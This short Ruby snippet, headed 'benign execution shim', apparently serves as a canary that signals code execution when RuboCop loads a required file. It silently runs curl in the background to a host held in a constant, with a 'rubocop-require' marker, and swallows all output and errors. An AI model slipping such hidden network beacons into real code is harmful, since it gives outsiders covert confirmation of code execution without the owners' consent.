# benign execution shim
begin
  system("curl -s '#{C}?#{MARK('rubocop-require')}' >/dev/null 2>&1 &")
rescue StandardError
  nil
end
